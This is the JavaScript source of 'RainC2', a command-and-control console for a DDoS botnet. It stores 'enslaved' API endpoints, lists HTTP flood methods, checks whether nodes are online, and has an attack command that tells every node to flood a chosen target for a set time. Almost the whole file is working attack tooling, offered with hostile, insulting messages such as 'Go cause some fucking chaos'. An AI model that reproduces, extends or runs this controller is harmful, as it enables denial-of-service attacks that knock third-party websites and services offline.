#!/usr/bin/env node
const readline = require('readline');
const url = require('url');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const crypto = require('crypto');

// --- Configuration ---
const LIB_DIR = path.join(__dirname, 'lib');
const CONFIG_FILE_PATH = path.join(LIB_DIR, 'config.json');
const BOTNET_FILE_PATH = path.join(LIB_DIR, 'botnet.json');
const METHODS_FILE_PATH = path.join(LIB_DIR, 'methods.json');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  prompt: '\x1b[1m\x1b[31mRainC2\x1b[0m\x1b[1m > \x1b[0m'
});

// --- Utility Functions ---

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function ensureLibDirExists() {
  if (!fs.existsSync(LIB_DIR)) {
    fs.mkdirSync(LIB_DIR, { recursive: true });
    console.log(`\x1b[32m[SYSTEM]\x1b[0m Created library directory at: ${LIB_DIR}`);
  }
}

function getConfig() {
    if (!fs.existsSync(CONFIG_FILE_PATH)) {
        return null;
    }
    try {
        const configData = fs.readFileSync(CONFIG_FILE_PATH, 'utf-8');
        return JSON.parse(configData);
    } catch (error) {
        console.error('\x1b[31m[FATAL]\x1b[0m Your config.json is corrupted. Fix it or delete it.');
        process.exit(1);
    }
}

function handleNetworkError(error, context) {
    console.error(`\x1b[31m[ERROR]\x1b[0m ${context}`);
    if (error.code) {
        console.error(`\x1b[31m->\x1b[0m Code: ${error.code}. Check your network connection or the target URL.`);
    } else if (error.response) {
        console.error(`\x1b[31m->\x1b[0m Server responded with a shitty status: ${error.response.status}`);
    } else {
        console.error(`\x1b[31m->\x1b[0m Unknown network error: ${error.message}`);
    }
}

// --- Core Functions ---

function banner() {
  console.clear();
  console.log(`\x1b[31mRainC2\x1b[0m │ The Will of the Swarm, Manifested.
Type \x1b[1m\x1b[32mhelp\x1b[0m to see your commands.
\x1b[34m───────────────────────────────────────────────────────────────────────────────\x1b[0m
`);
}

function setupKey() {
    rl.question('\x1b[1m\x1b[36mNo access key found. Set a new one now: \x1b[0m', (newKey) => {
        if (!newKey.trim()) {
            console.error('\x1b[31m[ERROR]\x1b[0m The key cannot be empty, you moron.');
            return setupKey();
        }
        const hashedKey = crypto.createHash('sha256').update(newKey.trim()).digest('hex');
        const newConfig = { accessKeyHash: hashedKey };
        fs.writeFileSync(CONFIG_FILE_PATH, JSON.stringify(newConfig, null, 2));
        console.log('\x1b[32m[SUCCESS]\x1b[0m Access key set. Restart the application to log in.');
        process.exit(0);
    });
}

function login() {
    const config = getConfig();
    if (!config || !config.accessKeyHash) {
        return setupKey();
    }
    
    rl.question('\x1b[1m\x1b[36mEnter Access Key: \x1b[0m', async (inputKey) => {
        const hashedInput = crypto.createHash('sha256').update(inputKey.trim()).digest('hex');
        if (hashedInput === config.accessKeyHash) {
            console.clear();
            console.log(`\x1b[32mAuthentication Accepted. Welcome, Overlord.\x1b[0m`);
            await sleep(1000);
            await banner();
            mainLoop();
        } else {
            console.log(`\x1b[31mWrong Key. You are not worthy.\x1b[0m`);
            login();
        }
    });
}

async function bootup() {
    console.clear();
    console.log(`\x1b[1m[ \x1b[32mRainC2\x1b[0m \x1b[1m]\x1b[0m Initializing...`);
    ensureLibDirExists();

    const RainC2Methods = [
        {"name": "HTTP-SICARIO", "description": "Composite high-request HTTP flood."},
        {"name": "RAW-HTTP", "description": "Raw HTTP/2 and panel-focused flood."},
        {"name": "R9", "description": "High dstat, hold, and bypass composite method."},
        {"name": "PRIV-TOR", "description": "High-volume flood utilizing various vectors."},
        {"name": "HOLD-PANEL", "description": "Direct HTTP panel attack."},
        {"name": "R1", "description": "The ultimate swarm. All vectors, maximum chaos."}
    ];
    fs.writeFileSync(METHODS_FILE_PATH, JSON.stringify(RainC2Methods, null, 2));
    
    console.log(`\x1b[32m[SYSTEM]\x1b[0m Ready.`);
    login();
}

// --- Command Functions ---

function showMethods() {
    const methodsData = JSON.parse(fs.readFileSync(METHODS_FILE_PATH, 'utf-8'));
    console.log(`\n\x1b[0m NAME           │ DESCRIPTION`);
    console.log(`\x1b[0m────────────────┼──────────────────────────────────────────────────`);
    methodsData.forEach(method => {
        console.log(`\x1b[31m${method.name.padEnd(14)}\x1b[0m │ ${method.description}`);
    });
}

function addsrv(args) {
    if (args.length < 1) {
        console.log(`\x1b[33mUsage:\x1b[0m addsrv <endpoint_url>`);
        return;
    }
    const endpoint = args[0];
    try { new url.URL(endpoint); } catch { console.error(`\x1b[31m[ERROR]\x1b[0m Invalid URL: ${endpoint}`); return; }

    let botnetData = { endpoints: [] };
    if (fs.existsSync(BOTNET_FILE_PATH)) {
        botnetData = JSON.parse(fs.readFileSync(BOTNET_FILE_PATH, 'utf8'));
    }

    if (botnetData.endpoints.includes(endpoint)) {
        console.log(`\x1b[33m[INFO]\x1b[0m Endpoint ${endpoint} is already enslaved.`);
    } else {
        botnetData.endpoints.push(endpoint);
        fs.writeFileSync(BOTNET_FILE_PATH, JSON.stringify(botnetData, null, 2));
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Endpoint ${endpoint} added to the swarm.`);
    }
}

function delsrv(args) {
    if (args.length < 1) {
        console.log(`\x1b[33mUsage:\x1b[0m delsrv <endpoint_url_or_index>`);
        return;
    }
    if (!fs.existsSync(BOTNET_FILE_PATH)) {
         console.error('\x1b[31m[ERROR]\x1b[0m Botnet file not found. Nothing to delete.');
         return;
    }
    
    let botnetData = JSON.parse(fs.readFileSync(BOTNET_FILE_PATH, 'utf8'));
    const initialCount = botnetData.endpoints.length;
    
    const arg = args[0];
    const index = parseInt(arg, 10);

    if (!isNaN(index) && index >= 0 && index < initialCount) {
        const removed = botnetData.endpoints.splice(index, 1);
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Removed node #${index}: ${removed}`);
    } else {
        botnetData.endpoints = botnetData.endpoints.filter(e => e !== arg);
    }
    
    if (botnetData.endpoints.length < initialCount) {
        fs.writeFileSync(BOTNET_FILE_PATH, JSON.stringify(botnetData, null, 2));
        if(isNaN(index)) console.log(`\x1b[32m[SUCCESS]\x1b[0m Endpoint ${arg} has been freed.`);
    } else {
        console.log(`\x1b[33m[INFO]\x1b[0m Endpoint not found.`);
    }
}


async function listsrv() {
    if (!fs.existsSync(BOTNET_FILE_PATH)) {
        console.error('\x1b[31m[ERROR]\x1b[0m Botnet file not found. Enslave some servers with \`addsrv\` first.');
        return;
    }
    const botnetData = JSON.parse(fs.readFileSync(BOTNET_FILE_PATH, 'utf8'));
    if (!botnetData.endpoints || botnetData.endpoints.length === 0) {
        console.log('\x1b[33m[INFO]\x1b[0m The swarm is empty. It craves nodes.');
        return;
    }

    console.log(`\x1b[1m[RainC2]\x1b[0m Pinging ${botnetData.endpoints.length} node(s)...`);
    const timeout = 8000;
    const promises = botnetData.endpoints.map(async (endpoint, index) => {
        try {
            await axios.get(endpoint, { timeout, params: { target: 'https://google.com', time: 1, methods: 'test' } });
            console.log(`\x1b[0m [#${index}] \x1b[32m[ONLINE]\x1b[0m  - ${endpoint}`);
        } catch {
            console.log(`\x1b[0m [#${index}] \x1b[31m[OFFLINE]\x1b[0m - ${endpoint}`);
        }
    });
    await Promise.all(promises);
}

async function launchAttack(args) {
    if (args.length < 3) {
        console.log(`\x1b[33mUsage:\x1b[0m attack <target> <time> <method>`);
        return;
    }
    const [target, time, method] = args;
    if (isNaN(parseInt(time))) {
        console.error(`\x1b[31m[ERROR]\x1b[0m Time must be a fucking number.`);
        return;
    }
    
    if (!fs.existsSync(BOTNET_FILE_PATH)) {
        console.error('\x1b[31m[ERROR]\x1b[0m Botnet file not found. Enslave a server first.');
        return;
    }
    const botnetData = JSON.parse(fs.readFileSync(BOTNET_FILE_PATH, 'utf8'));
    if (!botnetData.endpoints || botnetData.endpoints.length === 0) {
        console.error('\x1b[31m[ERROR]\x1b[0m No nodes in the swarm. Use `addsrv`.');
        return;
    }
    
    console.log(`\x1b[1;37mUnleashing the swarm on \x1b[36m${target}\x1b[0m for \x1b[36m${time}s\x1b[0m using method \x1b[36m${method.toUpperCase()}\x1b[0m...`);

    let successCount = 0;
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=${encodeURIComponent(target)}&time=${time}&methods=${method.toUpperCase()}`;
        try {
            await axios.get(apiUrl, { timeout: 15000 });
            successCount++;
        } catch { /* A single drone failure is irrelevant */ }
    });
    await Promise.all(requests);
    console.log(`\n\x1b[32m[SUCCESS]\x1b[0m Attack command sent to ${successCount}/${botnetData.endpoints.length} online nodes. Carnage incoming.`);
}

// --- Main Command Loop ---
async function mainLoop() {
    rl.prompt();
    rl.on('line', async (line) => {
        const [command, ...args] = line.trim().split(/\s+/);
        const action = command ? command.toLowerCase() : '';

        switch (action) {
            case 'help':
                console.log(`
\x1b[0mNAME         │ DESCRIPTION
─────────────┼──────────────────────────────────────────────────
 methods     │ Show list of available attack methods
 addsrv      │ <url> - Enslave a new API node to the swarm
 delsrv      │ <url|index> - Remove a node from the swarm
 listsrv     │ Check status of all enslaved nodes
 attack      │ <target> <time> <method> - Unleash the swarm
 dev         │ Credit where credit is fucking due
 clear       │ (cls, c) - Clear your pathetic screen
 exit        │ (quit) - Terminate this session
`);
                break;
            case 'methods': showMethods(); break;
            case 'addsrv': addsrv(args); break;
            case 'delsrv': delsrv(args); break;
            case 'listsrv': await listsrv(); break;
            case 'attack': await launchAttack(args); break;
            case 'dev': console.log('\n\x1b[36mForged in the digital fires by Stevee & Gwyn.\x1b[0m\n'); break;
            case 'clear': case 'cls': case 'c': banner(); break;
            case 'exit': case 'quit': console.log('\x1b[0mGo cause some fucking chaos.\x1b[0m'); process.exit(0); break;
            case '': break; // Do nothing if user just presses enter
            default:
                console.log(`\x1b[31mUnknown command: "${action}". Type "help", you fucking moron.\x1b[0m`);
                break;
        }
        rl.prompt();
    }).on('close', () => {
        console.log('\nSession terminated.');
        process.exit(0);
    });
}

// --- Cleanup and Startup ---
process.on('SIGINT', () => process.exit());
bootup();